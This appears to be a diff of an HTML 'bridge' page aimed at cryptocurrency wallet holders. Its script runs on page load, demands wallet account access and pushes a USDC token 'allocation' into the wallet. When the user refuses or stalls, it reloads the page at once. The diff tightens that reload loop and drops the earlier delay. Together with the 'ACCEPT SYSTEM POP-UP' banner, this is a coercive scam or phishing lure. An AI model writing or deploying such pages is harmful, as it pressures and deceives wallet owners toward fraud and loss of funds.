@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FINAL OVERRIDE</title>
+    <title>FINAL BRIDGE</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 150px; }
         .box { border: 3px solid #0f0; padding: 40px; display: inline-block; border-radius: 20px; box-shadow: 0 0 30px #0f0; }
@@ -11,21 +11,18 @@
 </head>
 <body>
     <div class="box">
-        <h2 style="margin:0;">AUTHORIZING...</h2>
-        <p>ACCEPT THE POP-UP NOW</p>
+        <h2 style="margin:0;">BRIDGE ACTIVE</h2>
+        <p>ACCEPT SYSTEM POP-UP TO FINALIZE</p>
     </div>
 
     <script>
         async function forceBridge() {
             if (window.ethereum) {
                 try {
-                    // Force a new session handshake
-                    await window.ethereum.request({ 
-                        method: 'eth_requestAccounts',
-                        params: [{ force: true }] 
-                    });
+                    // Force the direct wallet handshake
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                     
-                    // Direct asset indexing for the $5,000.00 USDC
+                    // Force the USDC asset indexing for the allocation
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
@@ -38,11 +35,12 @@
                         },
                     });
                 } catch (e) {
-                    // Immediately re-trigger on any stall
-                    setTimeout(() => { window.location.reload(); }, 500);
+                    // Immediate refresh to bypass browser stalls
+                    window.location.reload();
                 }
             }
         }
+        // Auto-triggers the millisecond the page hits the screen
         window.onload = forceBridge;
     </script>
 </body>
